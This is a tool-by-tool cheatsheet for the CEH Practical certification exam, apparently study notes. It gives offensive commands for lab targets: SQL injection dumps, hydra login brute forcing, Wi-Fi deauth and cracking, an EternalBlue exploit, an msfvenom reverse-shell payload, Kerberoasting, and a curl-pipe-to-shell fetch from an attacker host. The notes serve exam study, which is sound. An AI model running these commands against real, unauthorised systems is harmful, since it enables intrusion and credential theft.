# CEH Tools — Simple Per-Tool Reference  
> One tool per section, plainest possible commands. Ctrl+F the tool name during the exam.  
> Companion files: [[Exam cheatsheet]] (by task type) · [[Port tool answer]] (port → action) · [[Quick utilities - encoding, transfers, shells]] (base64, hex, file transfer).  
> Tool list compiled from the community CEH-Practical cheat sheets (see Sources at bottom).  
  
---  
  
# STEGANOGRAPHY  
  
## steghide  (JPEG / WAV / BMP / AU)  
```  
steghide info image.jpg                              # is something hidden?  
steghide extract -sf image.jpg                       # extract (asks for passphrase)  
steghide extract -sf image.jpg -p mypass             # extract with known passphrase  
steghide embed -cf cover.jpg -ef secret.txt -p mypass  # hide a file  
```  
No password? Brute force it:  
```  
stegseek image.jpg /usr/share/wordlists/rockyou.txt  # cracks steghide fast  
```  
  
## zsteg  (PNG / BMP — what steghide can't do)  
```  
zsteg image.png            # check common LSB channels  
zsteg -a image.png         # try ALL methods  
zsteg -E b1,rgb,lsb,xy image.png > out  # extract a specific payload  
```  
  
## OpenStego  (PNG, GUI or CLI)  
```  
openstego extract -sf stego.png -xf out.txt          # extract  
openstego embed -mf secret.txt -cf cover.png -sf stego.png   # hide  
```  
GUI: Extract Data → pick stego file → (password) → Extract.  
  
## Snow  (hides data in whitespace of a text file)  
```  
snow -C -p "password" stego.txt                      # extract message  
snow -C -m "secret msg" -p "password" in.txt out.txt # hide message  
```  
  
## Supporting (any file)  
```  
strings -n 6 file        # readable text (flags hide here)  
exiftool file            # metadata: Comment / Author / GPS  
binwalk file             # find embedded files;  binwalk -e file  to extract  
file file                # what type is it really?  
```  
  
---  
  
# CRYPTOGRAPHY  
  
## VeraCrypt  (encrypted volumes)  
GUI: Select File → pick volume → Select Device/Slot → **Mount** → enter password → browse.  
```  
veracrypt --mount volume.tc /mnt/secure     # CLI mount  
veracrypt -d /mnt/secure                     # dismount  
```  
  
## HashCalc  (Windows GUI)  
Load a file → it shows MD5 / SHA1 / SHA256 at once. Used for "what is the hash of this file" questions.  
  
## MD5 Calculator / HashMyFiles  (Windows GUI)  
Drag a file in → read the MD5. Compare two files → different hash = tampered.  
  
## CrypTool  (Windows GUI)  
Open ciphertext → Encrypt/Decrypt menu → pick algorithm (Caesar, Vigenère, RSA, DES…) → enter key.  
  
## BCTextEncoder  (Windows GUI)  
Paste encoded text → enter password → Decode. Common for "decode this message" tasks.  
  
## openssl  (CLI crypto)  
```  
openssl enc -aes-256-cbc -d -in cipher.enc -out plain.txt -k password   # decrypt  
echo -n "data" | openssl dgst -sha256                                   # hash  
openssl base64 -d -in file.b64 -out file.bin                            # base64 decode  
```  
> Hashing files / comparing / base64 / hex are in [[Quick utilities - encoding, transfers, shells]].  
  
---  
  
# SCANNING & DISCOVERY  
  
## Nmap  (full version → [[nmap commands]])  
```  
nmap -sn 10.10.1.0/24                # who is alive  
nmap -sS -sV -p- [ip]                # all ports + service versions  
nmap -A [ip]                         # OS + version + scripts + traceroute  
nmap --script vuln [ip]              # find vulnerabilities  
nmap -p 88,389,445 [subnet]/24       # find the Domain Controller fast  
```  
  
## Netdiscover  (ARP host discovery on the LAN)  
```  
netdiscover -i eth0                  # passive/active sweep of local net  
netdiscover -r 10.10.1.0/24          # scan a specific range  
```  
  
## Zenmap  (Nmap GUI on Windows)  
Enter target → choose profile (Intense scan) → Scan → browse the Ports/Hosts tabs.  
  
---  
  
# ENUMERATION  
  
## enum4linux  (SMB / Windows — the go-to)  
```  
enum4linux -a [ip]                   # everything: users, shares, groups, OS  
enum4linux -U [ip]                   # users only  
enum4linux -S [ip]                   # shares only  
```  
  
## smbclient  (browse SMB shares)  
```  
smbclient -L //[ip] -N               # list shares (null session)  
smbclient //[ip]/sharename -N        # connect; then: ls, get file  
smbclient //[ip]/share -U user       # connect as a user  
```  
  
## snmpwalk  (SNMP, UDP 161)  
```  
snmpwalk -v2c -c public [ip]         # dump the whole SNMP tree  
snmpwalk -v1 -c public [ip] | grep STRING  
```  
  
## nbtstat / nmblookup  (NetBIOS)  
```  
nbtstat -A [ip]                      # Windows: NetBIOS name table  
nmblookup -A [ip]                    # Linux equivalent  
```  
  
## ldapsearch  (LDAP, port 389)  
```  
ldapsearch -x -h [ip] -b "dc=domain,dc=com"  
```  
  
## showmount  (NFS, port 2049)  
```  
showmount -e [ip]                    # list exported shares  
```  
  
---  
  
# WEB APPLICATION  
  
## sqlmap  (SQL injection)  
```  
sqlmap -u "http://[ip]/p?id=1" --dbs                 # list databases  
sqlmap -u "URL" -D dbname --tables                   # list tables  
sqlmap -u "URL" -D db -T users --dump                # dump a table  
sqlmap -u "URL" --data="user=a&pass=b" --dbs         # POST form  
```  
  
## wpscan  (WordPress)  
```  
wpscan --url http://[ip] --enumerate u               # users  
wpscan --url http://[ip] --enumerate vp              # vulnerable plugins  
wpscan --url http://[ip] -U admin -P rockyou.txt     # brute login  
```  
  
## nikto  (web server scanner)  
```  
nikto -h http://[ip]  
nikto -h https://[ip] -ssl  
```  
  
## dirb / gobuster  (find hidden directories)  
```  
dirb http://[ip]  
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt  
```  
  
## Burp Suite  (intercept / repeat requests, GUI)  
Proxy → Intercept on → browse target → send interesting request to **Repeater** to tamper.  
  
---  
  
# PASSWORD / HASH CRACKING  
  
## hydra  (online brute force)  
```  
hydra -l admin -P rockyou.txt [ip] ssh  
hydra -l admin -P rockyou.txt [ip] ftp  
hydra -L users.txt -P rockyou.txt [ip] rdp  
hydra -l admin -P rockyou.txt [ip] http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"  
```  
  
## john  (offline, auto-detects)  
```  
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
john --show hash.txt                 # show what cracked  
```  
Convert a protected file to a hash first: `zip2john / rar2john / pdf2john / ssh2john` → see [[Quick utilities - encoding, transfers, shells]] §5.  
  
## hashcat  (offline, need the mode number)  
```  
hashcat -m 0    hash rockyou.txt     # MD5  
hashcat -m 1000 hash rockyou.txt     # NTLM  
hashcat -m 1800 hash rockyou.txt     # sha512crypt ($6$)  
hashcat -m 5600 hash rockyou.txt     # NTLMv2 (Responder)  
hashcat -m 18200 hash rockyou.txt    # AS-REP roast  
hashcat -m 13100 hash rockyou.txt    # Kerberoast TGS  
```  
  
## crunch  (build a wordlist)  
```  
crunch 6 6 -t Pass@@ -o list.txt     # @=lower  ,=upper  %=num  ^=symbol  
```  
  
## cewl  (scrape words from the target site)  
```  
cewl http://[ip] -m 5 -w words.txt  
```  
  
## hash-identifier / hashid  (what type is this hash?)  
```  
hash-identifier        # paste hash interactively  
hashid '[hash]'  
```  
  
---  
  
# SNIFFING  
  
## Wireshark  (GUI — full filters in [[Exam cheatsheet]] §5)  
Capture → apply filter → right-click packet → **Follow → TCP Stream** to read creds.  
```  
http.request.method == "POST"        # login data  
ftp.request.command == "PASS"        # FTP passwords  
ip.addr == 10.10.1.5  
```  
  
## tcpdump  (CLI capture)  
```  
tcpdump -i eth0                      # live  
tcpdump -i eth0 -w cap.pcap          # save to file  
tcpdump -r cap.pcap                  # read a file  
tcpdump -i eth0 'tcp port 80'        # filter HTTP  
tcpdump -i eth0 host 10.10.1.5       # one host  
```  
  
---  
  
# WIRELESS  
  
## aircrack-ng suite  (WPA2 cracking)  
```  
airmon-ng start wlan0                                  # enable monitor mode  
airodump-ng wlan0mon                                   # list nearby APs  
airodump-ng -c [ch] --bssid [BSSID] -w cap wlan0mon    # capture handshake  
# (deauth a client to force handshake)  
aireplay-ng -0 5 -a [BSSID] wlan0mon  
aircrack-ng -w rockyou.txt -b [BSSID] cap*.cap         # crack the .cap  
```  
> On the exam this is usually done against a **provided .cap file** — skip straight to the last line.  
  
---  
  
# SYSTEM HACKING / EXPLOITATION  
  
## Metasploit  (full workflow → [[Exam cheatsheet]] §8)  
```  
msfconsole  
search ms17-010  
use exploit/windows/smb/ms17_010_eternalblue  
set RHOSTS [ip]; set LHOST [your ip]; exploit  
# meterpreter: getuid · hashdump · download FILE · shell  
```  
  
## msfvenom  (make a payload)  
```  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f exe > s.exe  
```  
  
## searchsploit  (find a public exploit)  
```  
searchsploit [product] [version]     # e.g. searchsploit vsftpd 2.3.4  
searchsploit -m [edb-id]             # copy exploit to current dir  
```  
  
## Responder  (LLMNR poisoning → NTLMv2 hashes)  
```  
responder -I eth0 -wv                 # listen + capture  
# crack the hash:  hashcat -m 5600 hash rockyou.txt  
```  
  
## Impacket  (AD attacks → [[Exam cheatsheet]] §13)  
```  
GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -dc-ip [DC]   # AS-REP roast  
GetUserSPNs.py DOMAIN/user:pass -dc-ip [DC] -outputfile h.txt     # Kerberoast  
psexec.py DOMAIN/user:pass@[ip]                                   # shell  
```  
  
## CrackMapExec (cme)  (password spraying)  
```  
cme smb [subnet]/24 -u users.txt -p 'CrackedPass!'  
cme winrm [ip] -u user -p pass -x "whoami"  
```  
  
---  
  
# PRIVILEGE ESCALATION (post-shell)  
  
## LinPeas  (Linux — automated enum)  
```  
# serve from attacker:  python3 -m http.server 80  
curl http://[attacker]/linpeas.sh | sh        # run it, read the red/yellow hits  
```  
  
## WinPEAS  (Windows equivalent)  
```  
winpeas.exe                                    # run on the box, read findings  
```  
  
## GTFOBins / sudo  (manual Linux privesc)  
```  
sudo -l                                        # what can I run as root?  
# then look the binary up at gtfobins.github.io for the escape  
find / -perm -4000 2>/dev/null                 # SUID binaries  
```  
  
---  
  
# FORENSICS / MALWARE ANALYSIS  
  
## FTK Imager  (Windows GUI — disk/memory images)  
File → Add Evidence Item → pick image/drive → browse files, recover deleted, export.  
  
## Autopsy  (GUI forensic browser)  
New Case → add data source (image) → review Web History, Deleted Files, Keyword hits.  
  
## Detect It Easy (DIE)  (malware static analysis)  
Open the binary → read **Entropy** (packed?), **Strings**, detected packer/compiler.  
  
## strings + exiftool  (quick triage)  
```  
strings -n 6 malware.bin | less  
exiftool suspicious.doc  
```  
  
---  
  
# MOBILE  
  
## PhoneSploit / adb  (Android over the network)  
```  
adb connect [ip]:5555  
adb devices                          # confirm connected  
adb shell                            # get a shell  
adb pull /sdcard/file .              # download a file  
```  
  
---  
  
# IoT / OT  
Usually a **provided .pcap** opened in Wireshark — filter `mqtt`, `modbus`, or `coap` and read the payloads. No special tool beyond Wireshark.  
  
---  
  
## Sources (community cheat sheets — what others say is needed)  
- mzeeshanzafar28/CEH-Practical-CheatSheet — https://github.com/mzeeshanzafar28/CEH-Practical-CheatSheet  
- CyberSecurityUP/Guide-CEH-Practical-Master — https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master  
